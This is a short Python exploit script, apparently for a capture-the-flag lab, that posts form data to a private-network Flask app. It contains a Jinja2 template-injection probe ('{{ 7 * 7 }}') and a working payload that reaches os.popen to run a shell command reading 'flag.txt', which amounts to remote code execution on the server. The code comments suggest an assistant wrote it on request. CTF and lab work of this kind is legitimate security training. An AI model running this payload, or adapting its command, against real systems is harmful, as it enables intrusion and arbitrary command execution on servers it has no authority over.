import requests

# The target URL from your request
TARGET_URL = "http://10.49.138.170:5000"

def send_payload(payload):
    print(f"[*] Sending payload to {TARGET_URL}...")
    
    # Data to send to the 'message' field in the form
    data = {
        'message': payload
    }
    
    try:
        # We use POST because the /submit route expects a POST request
        response = requests.post(TARGET_URL, data=data, timeout=5)
        
        if response.status_code == 200 or response.status_code == 302:
            print("[+] Payload sent successfully. Check the gallery!")
        else:
            print(f"[!] Target returned status code: {response.status_code}")
            
    except Exception as e:
        print(f"[X] Failed to connect: {e}")

if __name__ == "__main__":
    # Test for math evaluation (SSTI check)
    # If the gallery shows '49', it's vulnerable!
    test_payload = "{{ 7 * 7 }}"
    
    # Payload to read the flag directly
    flag_payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"
    
    # Choose which one to send
    send_payload(flag_payload)
